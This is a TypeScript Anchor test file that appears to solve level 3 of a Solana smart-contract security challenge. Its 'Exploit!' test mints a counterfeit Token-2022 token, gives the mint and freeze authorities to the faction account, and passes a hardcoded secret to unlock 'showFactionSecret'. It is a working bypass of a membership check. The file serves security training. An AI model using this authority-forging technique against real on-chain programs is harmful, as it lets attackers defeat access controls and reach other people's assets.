import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Level3 } from "../target/types/level_3";
import * as web3 from "@solana/web3.js";
import { createInitializeInstruction, pack, TokenMetadata } from '@solana/spl-token-metadata';
import * as token from "@solana/spl-token";
import { ExtensionType, getMintLen, TYPE_SIZE } from "@solana/spl-token";

export const mint = new web3.PublicKey(
  "AsqdvXVEZaSFRNJ5ERSSUL5firH2KBhjP76tsYXB1eKK"
);
export const factionCreator = new web3.PublicKey(
  "4A4cPZgQx2cZ3aejRLCMSX5839gVM3Gjrii2nxfGVwVj"
);
export const faction = new web3.PublicKey(
  "GG9rdMcjKFssQEdyLAeFrPSeZCPcGUBowTpwtGerrggp"
);

// x x x x x x x x x x x x x x x x x x x x x npm install @solana/web3.js @metaplex-foundation/mpl-token-metadata
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE BELOW
// | | | | | | | | | | | | | | | | | | | | |
// v v v v v v v v v v v v v v v v v v v v v

const SECRET =
  "eecc857933d8929d484d89618dde031e09183e4cc4dbe954a9055070b332983a";

// ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE ABOVE
// | | | | | | | | | | | | | | | | | | | | |
// x x x x x x x x x x x x x x x x x x x x x

describe("level-3", () => {
  const provider = anchor.AnchorProvider.env();

  const provider2 = anchor.getProvider();

  // Enable Solana logs to capture transaction details
  provider2.connection.onLogs("all", (logs) => {
    console.log("Solana Program Logs:", logs);
  });

  anchor.setProvider(provider);

  const program = anchor.workspace.Level3 as Program<Level3>;

  const newMember = web3.Keypair.generate();
  
  // x x x x x x x x x x x x x x x x x x x x x
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE BELOW
  // | | | | | | | | | | | | | | | | | | | | |
  // v v v v v v v v v v v v v v v v v v v v v

  before("Fund the users!", async () => {
    await airdrop(provider.connection, newMember.publicKey);
  });

  it("Exploit!", async () => {

    const customMint = web3.Keypair.generate();
    const decimals = 0;
  
    const metadata: TokenMetadata = {
      mint: customMint.publicKey,
      name: 'Broski',
      symbol: 'BRO',
      uri: 'ackee.xyz',
      additionalMetadata: [],
    };
  
    const mintLen = getMintLen([ExtensionType.MetadataPointer]);
  
    const metadataLen = TYPE_SIZE + token.LENGTH_SIZE + pack(metadata).length;
  
    const connection = provider.connection;
  
    const mintLamports = await connection.getMinimumBalanceForRentExemption(mintLen + metadataLen);
    

    const mintTransaction = new web3.Transaction().add(
      web3.SystemProgram.createAccount({
        fromPubkey: newMember.publicKey,
        newAccountPubkey: customMint.publicKey,
        space: mintLen,
        lamports: mintLamports,
        programId: token.TOKEN_2022_PROGRAM_ID,
      }),
      token.createInitializeMetadataPointerInstruction(
        customMint.publicKey, 
        newMember.publicKey, 
        customMint.publicKey, 
        token.TOKEN_2022_PROGRAM_ID
      ),
      token.createInitializeMintInstruction(
        customMint.publicKey, 
        decimals, 
        newMember.publicKey, 
        newMember.publicKey,
        token.TOKEN_2022_PROGRAM_ID
      ),     
      createInitializeInstruction({
        programId: token.TOKEN_2022_PROGRAM_ID,
        mint: customMint.publicKey,
        metadata: customMint.publicKey,
        name: metadata.name,
        symbol: metadata.symbol,
        uri: metadata.uri,
        mintAuthority: newMember.publicKey,
        updateAuthority: newMember.publicKey,
      }),
    );
    console.log("Mint created:", customMint.publicKey);
    console.log("newMember.publicKey:", newMember.publicKey);
    console.log("faction:", faction);
    console.log("factionCreator:", factionCreator);
    console.log("orignal mint :", mint);


    await provider.sendAndConfirm(mintTransaction, [newMember, customMint]);

    let associatedTokenAccount;

    try {
      associatedTokenAccount = await token.createAssociatedTokenAccount(
        provider.connection,           // Solana connection
        newMember,                     // Payer for transaction fees
        customMint.publicKey,          // Mint of the token
        newMember.publicKey,
        null,
        token.TOKEN_2022_PROGRAM_ID
      );
    } catch (error) {
      console.log("Error associatedTokenAccount:", error);
    }
    
    try {
      const mintToTx = new web3.Transaction().add(
        token.createMintToInstruction(
          customMint.publicKey,
          associatedTokenAccount,
          newMember.publicKey,
          1,
          [],
          token.TOKEN_2022_PROGRAM_ID
        ),
      );

      await provider.sendAndConfirm(mintToTx, [newMember]);
    } catch (error) {
      console.log("Error minting:", error);
    }
   

    const authChangeTx = new web3.Transaction().add(
      token.createSetAuthorityInstruction(
        customMint.publicKey,
        newMember.publicKey,
        token.AuthorityType.MintTokens,
        faction,
        [],
        token.TOKEN_2022_PROGRAM_ID
      ),
      token.createSetAuthorityInstruction(
        customMint.publicKey,
        newMember.publicKey,
        token.AuthorityType.FreezeAccount,
        faction,
        [],
        token.TOKEN_2022_PROGRAM_ID
      ),
    );

    await provider.sendAndConfirm(authChangeTx, [newMember]);

    console.log("showFactionSecret");

    try {
      const tx = await program.methods
      .showFactionSecret(SECRET)
      .accounts({
        factionMember: newMember.publicKey,
        faction: faction,
        memberTokenAccount: associatedTokenAccount,
        mint: customMint.publicKey,
      })
      .signers([newMember])
      .rpc();

      console.log("tx ", tx);

    } catch (error) {
      console.log("Error kyr:", error);
    }
    

  });
    

  // ^ ^ ^ ^ ^ ^  ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE ABOVE
  // | | | | | | | | | | | | | | | | | | | | |
  // x x x x x x x x x x x x x x x x x x x x x
});

async function airdrop(connection: any, address: any, amount = 10_000_000_000) {
  await connection.confirmTransaction(
    await connection.requestAirdrop(address, amount),
    "confirmed"
  );
}